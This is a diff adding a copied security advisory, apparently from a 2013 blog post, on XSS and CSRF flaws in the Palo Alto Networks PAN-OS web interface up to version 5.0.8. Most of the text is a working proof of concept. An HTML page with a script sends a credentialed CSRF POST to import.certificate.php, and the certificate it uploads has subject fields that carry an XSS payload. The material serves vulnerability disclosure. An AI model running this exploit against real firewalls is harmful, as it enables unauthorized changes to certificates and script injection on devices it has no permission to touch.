@@ -1,0 +1,120 @@
+from http://thomaspollet.blogspot.be/2013/11/Palo-Alto-XSS.html
+ :
+
+A couple of bugs exist in Palo Alto Networks PANOS <= 5.0.8 which can
+be exploited to conduct cross-site scripting attacks.
+
+   - Certificate fields are displayed in the firewall web interface without
+   proper sanitization applied to them. This way it is possible to inject html
+   into the web interface.
+   - Various file upload forms used by the firewall do not implement proper
+   CSRF protection. import.certificate.php for example.
+
+<http://1.bp.blogspot.com/-eX46K2I1S7w/Uo93fo02D4I/AAAAAAAAAgM/QLjdd7QY3UM/s1600/Capture.PNG>
+
+
+These issues have been fixed in PANOS 5.0.9 .
+
+Example html source code to CSRF POST a rogue cert :
+
+
+
+   1. PA: <input type="text" id="url" value="https://10.10.10.22">
+   2. <input type=button onclick="upload()" value="Upload Certificate"/>
+   3. <hr>
+   4. <textarea rows=80 cols=80 id=text>
+   5.
+   6. -----------------------------
+   7. Content-Disposition: form-data; name="ext-comp-2304"
+   8.
+   9. on
+   10. -----------------------------
+   11. Content-Disposition: form-data; name="certFile";
+   filename="server.crt"
+   12. Content-Type: application/octet-stream
+   13.
+   14. -----BEGIN CERTIFICATE-----
+   15. MIICXTCCAcYCCQDlZ1PR5Cpx7DANBgkqhkiG9w0BAQUFADBzMQswCQYDVQQGEwJY
+   16. WDEvMC0GA1UECAwmPHN0eWxlIG9ubG9hZD0iamF2YXNjcmlwdDphbGVydCgxKSIg
+   17. Lz4xFTATBgNVBAcMDERlZmF1bHQgQ2l0eTEcMBoGA1UECgwTRGVmYXVsdCBDb21w
+   18. YW55IEx0ZDAeFw0xMzEwMDExNjI4MThaFw0xNDEwMDExNjI4MThaMHMxCzAJBgNV
+   19. BAYTAlhYMS8wLQYDVQQIDCY8c3R5bGUgb25sb2FkPSJqYXZhc2NyaXB0OmFsZXJ0
+   20. KDEpIiAvPjEVMBMGA1UEBwwMRGVmYXVsdCBDaXR5MRwwGgYDVQQKDBNEZWZhdWx0
+   21. IENvbXBhbnkgTHRkMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCx0bSaWF4g
+   22. mRUD8Djl3RHx8RQmO6pua8HBKAG+05PotfsuqImyh1aTVGCmDECFMfid/QAOL/FY
+   23. 5qWKCmdXcAYTAi5oRIuhI7G9J9SInfFEdmW75HC1/pwhV2oR31a1XccYubGagcmu
+   24. gBadEXbhb6iU3QECx4d+zLAGadWEeWRF0wIDAQABMA0GCSqGSIb3DQEBBQUAA4GB
+   25. AAMSthJ0Z4+s4F8CMbNjEHgznV7AFNnZ9qsXRdP6N7jGFXwkpINhxoySHSsrDfmE
+   26. eefbJgdj5Js6PF+kMZlOeTCVo86GnAn64D17wcTsenmznH/iNj7yQM/AV7BMmRh2
+   27. FCMw2rOQLc2vZYC829s/nkShLl7iKYP/KewX3497VV3t
+   28. -----END CERTIFICATE-----
+   29.
+   30. -----------------------------
+   31. Content-Disposition: form-data; name="ext-comp-2306"
+   32.
+   33. Base64 Encoded Certificate (PEM)
+   34. -----------------------------
+   35. Content-Disposition: form-data; name="keyFile"; filename=""
+   36. Content-Type: application/octet-stream
+   37.
+   38.
+   39. -----------------------------
+   40. Content-Disposition: form-data; name="bImportCertificateSubmit"
+   41.
+   42. OK
+   43. -----------------------------
+   44. Content-Disposition: form-data; name="certFileC"
+   45.
+   46. server.crt
+   47. -----------------------------
+   48. Content-Disposition: form-data; name="vsysC"
+   49.
+   50. shared
+   51. -----------------------------
+   52. Content-Disposition: form-data; name="passPhrase"
+   53.
+   54.
+   55. -----------------------------
+   56. Content-Disposition: form-data; name="keyFileC"
+   57.
+   58.
+   59. -----------------------------
+   60. Content-Disposition: form-data; name="certName"
+   61.
+   62. TPOLLET
+   63. -----------------------------
+   64. Content-Disposition: form-data; name="format"
+   65.
+   66. pem
+   67. -----------------------------
+   68. Content-Disposition: form-data; name="includekey"
+   69.
+   70.
+   71. -----------------------------
+   72. Content-Disposition: form-data; name="certType"
+   73.
+   74. device
+   75. -----------------------------
+   76. Content-Disposition: form-data; name="template"
+   77.
+   78.
+   79. -------------------------------
+   80. &lt;/textarea&gt;
+   81.
+   82. <script>
+   83. function upload() {
+   84.   text = document.getElementById('text').value
+   85.   host = document.getElementById('url').value;
+   86.   url  = host + "/php/device/import.certificate.php";
+   87.   xhr  = new XMLHttpRequest();
+   88.   xhr.withCredentials = true;
+   89.   xhr.open("POST", url, true);
+   90.   xhr.setRequestHeader("Content-Type","multipart/form-data;
+   boundary=---------------------------");
+   91.   xhr.send(text);
+   92.   alert('check ' + host +
+   '/#device::vsys1::device/certificate-management/certificates' );
+   93. }
+   94.
+   95. </script>
+   96.
